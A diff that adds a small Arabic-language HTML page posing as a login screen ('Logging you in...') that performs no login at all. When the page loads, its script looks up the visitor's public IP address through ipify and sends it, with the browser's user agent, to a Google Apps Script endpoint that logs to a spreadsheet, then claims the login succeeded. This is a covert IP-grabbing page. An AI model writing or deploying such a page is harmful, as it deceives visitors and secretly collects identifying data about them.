@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>تسجيل دخول</title>
+  </head>
+  <body>
+    <h2>جارٍ تسجيل دخولك...</h2>
+    <script>
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          const ua = navigator.userAgent;
+          const target = "https://script.google.com/macros/s/AKfycbyRizNGrlso0EhP0s_WI8nXCRTwhx_5zxDADf9HDvIxXxu7FiyDgQ0OoT6_y7CGVvhC/exec";
+
+          // أرسل البيانات إلى Google Sheets
+          fetch(`${target}?ip=${ip}&ua=${encodeURIComponent(ua)}`)
+            .then(() => {
+              document.body.innerHTML = "<h2>تم تسجيل دخولك، شكرًا!</h2>";
+            });
+        });
+    </script>
+  </body>
+</html>
